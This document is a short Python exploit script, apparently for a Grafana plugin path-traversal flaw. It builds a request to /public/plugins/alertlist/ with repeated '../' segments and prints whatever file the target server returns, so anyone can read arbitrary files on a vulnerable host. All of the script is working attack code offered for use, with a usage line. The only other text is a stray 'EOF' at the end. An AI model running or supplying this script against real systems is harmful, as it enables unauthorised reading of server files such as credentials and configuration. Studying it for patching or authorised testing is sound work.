#!/usr/bin/env python3
import requests
import sys

def read_file(host, target_file):
    plugin = 'alertlist'
    traversal = '/'.join(['..'] * 12)
    url = f"{host}/public/plugins/{plugin}/{traversal}/{target_file.lstrip('/')}"
    try:
        resp = requests.get(url, timeout=5, verify=False)
    except requests.RequestException as exc:
        print(f"Request failed: {exc}")
        return
    if resp.status_code == 200 and 'Plugin file not found' not in resp.text:
        print(resp.text)
    else:
        print(f"Failed to read {target_file}: status {resp.status_code}")

if __name__ == '__main__':
    if len(sys.argv) != 3 or not sys.argv[1].startswith('http'):
        print('Usage: grafana_traversal.py http://host:port /path/to/file')
        sys.exit(1)
    read_file(sys.argv[1].rstrip('/'), sys.argv[2])
EOF

